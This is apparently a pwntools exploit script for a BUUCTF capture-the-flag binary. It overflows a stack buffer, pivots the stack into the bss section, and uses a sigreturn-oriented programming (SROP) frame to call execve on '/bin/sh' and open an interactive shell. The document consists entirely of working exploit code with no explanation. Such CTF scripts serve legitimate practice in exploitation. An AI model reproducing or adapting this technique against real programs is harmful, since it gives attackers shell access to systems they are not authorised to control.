#!/usr/bin/env python3

from pwn import *
from LibcSearcher import *


debug = 1
if debug:
    p = process('./pwn_1')
    context.terminal = ['tmux','splitw','-h']
    context.log_level='debug'
    gdb.attach(p)
else:
    p = remote('node5.buuoj.cn', 29508)
context.arch = 'amd64'

elf = ELF('./pwn_1')

offset = 56
bss = 0x404050 + 0x300
syscall = 0x0000000000401040
pop_rdi = 0x401203
lea = 0x401171
# syscall = elf.symbols['syscall']

print(hex(syscall))

p.recvuntil(b'welcome to srop!\n')
# payload = b'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaa'
payload = b'A' * 0x30
payload += p64(bss)
payload += p64(lea)
p.send(payload)



frame = SigreturnFrame()
frame.rdi = 59
frame.rsi = bss - 0x30 
frame.rdx = 0
frame.rcx = 0
frame.rsp = bss + 0x38
frame.rip = syscall


payload = b'/bin/sh\x00' + b'A' * 0x30
payload += p64(pop_rdi)
payload += p64(0xf)
payload += p64(syscall)
payload += bytes(frame) 
input()
p.send(payload)

p.interactive()

